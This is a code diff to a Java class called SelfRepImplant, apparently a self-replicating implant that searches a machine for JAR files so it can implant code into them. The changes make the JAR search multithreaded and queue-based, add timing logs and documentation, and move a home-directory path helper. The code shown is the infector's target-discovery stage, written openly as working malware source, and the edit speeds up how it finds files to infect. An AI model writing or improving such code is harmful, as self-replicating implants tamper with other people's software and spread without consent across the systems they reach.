@@ -15,9 +15,7 @@ import java.security.SecureRandom;
 import java.text.DecimalFormat;
 import java.time.Duration;
 import java.util.*;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
-import java.util.concurrent.TimeUnit;
+import java.util.concurrent.*;
 import java.util.concurrent.atomic.AtomicInteger;
 import java.util.jar.JarFile;
 import java.util.logging.Handler;
@@ -118,14 +116,16 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             });
         }
 
+        long dirTick = System.nanoTime();
         Set<Path> jarsToImplant;
         try {
             jarsToImplant = findAllJars(CONF_LIMIT_PATH, CONF_IGNORED_PATHS);
         } catch (Exception e) {
             System.out.println("[!] Failed to find JARs.");
-            e.printStackTrace();
             return;
         }
+        long dirTock = System.nanoTime();
+        System.out.println("[*] Found " + jarsToImplant.size() + " JARs. Search took " + Duration.ofNanos(dirTock - dirTick) + ".");
 
         ImplantHandler implantHandler;
         try {
@@ -281,6 +281,14 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         return findAllJars(root, null);
     }
 
+    /**
+     * Find all JAR files in a given directory, including subdirectories.
+     *
+     * @param root       path string
+     * @param ignoreSpec paths to ignore, separated by a semi-colon (';')
+     * @return all JAR files
+     * @throws IllegalArgumentException if the root is not a directory
+     */
     public static Set<Path> findAllJars(String root, String ignoreSpec) throws IllegalArgumentException {
         root = expandPath(root);
 
@@ -304,28 +312,60 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             }
         }
 
-        // Recurse through the file structure
+        ExecutorService dirThreads = Executors.newFixedThreadPool(CONF_THREADS);
+        Queue<Future<?>> futures = new ConcurrentLinkedQueue<>();
+
         Set<Path> validJarFiles = new HashSet<>();
-        findAllJars(dir, validJarFiles, Collections.unmodifiableSet(ignorePaths));
+        Queue<Path> subDirsToSearch = new ConcurrentLinkedQueue<>();
+        subDirsToSearch.add(dir);
+
+        // Keep searching until there are not more subdirectories at all.
+        while (!subDirsToSearch.isEmpty()) {
+            // Search through all subdirectories that the previous sweep found.
+            while (!subDirsToSearch.isEmpty()) {
+                // Take a subdirectory and search all items in it.
+                Path subDir = subDirsToSearch.poll();
+                futures.add(dirThreads.submit(() -> {
+                    /*
+                     * Deferring recursion into subdirectories like this prevents the tread pool from starving when
+                     * searching deep directory structures. The subDirsToSearch queue gets updated by findAllJars
+                     * as it finds new subdirectories, this lambda/task finishes, the thread is released and the
+                     * next iteration will pick up a subdirectory. Rinse and repeat until the whole directory
+                     * structure is searched.
+                     */
+                    findAllJars(subDir, validJarFiles, subDirsToSearch, Collections.unmodifiableSet(ignorePaths));
+                }));
+
+            }
+
+            // Wait for all the current directory searches (so that subDirsToSearch can be refilled).
+            for (Future<?> future : futures) {
+                try {
+                    future.get();
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                } catch (ExecutionException e) {
+                    System.out.println("[!] Background task failed: " + e.getMessage());
+                }
+            }
+        }
+
+        shutdownAndWaitForThreads(dirThreads);
 
         return validJarFiles;
     }
 
-    // Java does not natively support the ~ shorthand path. Expand it manually.
-    private static String expandPath(String pathSpec) {
-        if (pathSpec.contains("~")) {
-            String home = System.getProperty("user.home");
-            if (home == null) {
-                throw new IllegalArgumentException("Cannot find home directory.");
-            }
-
-            pathSpec = pathSpec.replace("~", home);
-        }
-        return pathSpec;
-    }
-
-    // Recursive function
-    private static void findAllJars(Path dir, Set<Path> accumulator, Set<Path> ignoredPaths) {
+    /**
+     * The recursive part of findAllJars.
+     * This method will mutate validJarFiles with any valid JAR files and subDirsToSearch with any subdirectories
+     * it found.
+     *
+     * @param dir             the directory to search
+     * @param accumulator     where all found JAR files will be added
+     * @param subDirsToSearch where all found subdirectories will be added
+     * @param ignoredPaths    paths that will be ignored
+     */
+    private static void findAllJars(Path dir, Set<Path> accumulator, Queue<Path> subDirsToSearch, Set<Path> ignoredPaths) {
         if (ignoredPaths.contains(dir)) {
             return;
         }
@@ -337,10 +377,9 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             return;
         }
 
-        List<Path> subDirs = new LinkedList<>();
         for (Path subPath : subPaths) {
             if (Files.isDirectory(subPath)) {
-                subDirs.add(subPath);
+                subDirsToSearch.add(subPath);
                 continue;
             }
 
@@ -359,10 +398,6 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
 
             accumulator.add(subPath);
         }
-
-        for (Path subDir : subDirs) {
-            findAllJars(subDir, accumulator, ignoredPaths);
-        }
     }
 
     private static boolean isJar(Path suspectedJarFile) {
@@ -371,6 +406,24 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         } catch (IOException e) {
             return false;
         }
+    }
+
+    /**
+     * Translate <code>~</code> into the home directory of the current user.
+     *
+     * @param pathSpec any path
+     * @return the same path but translated
+     */
+    private static String expandPath(String pathSpec) {
+        if (pathSpec.contains("~")) {
+            String home = System.getProperty("user.home");
+            if (home == null) {
+                throw new IllegalArgumentException("Cannot find home directory.");
+            }
+
+            pathSpec = pathSpec.replace("~", home);
+        }
+        return pathSpec;
     }
 
     /**
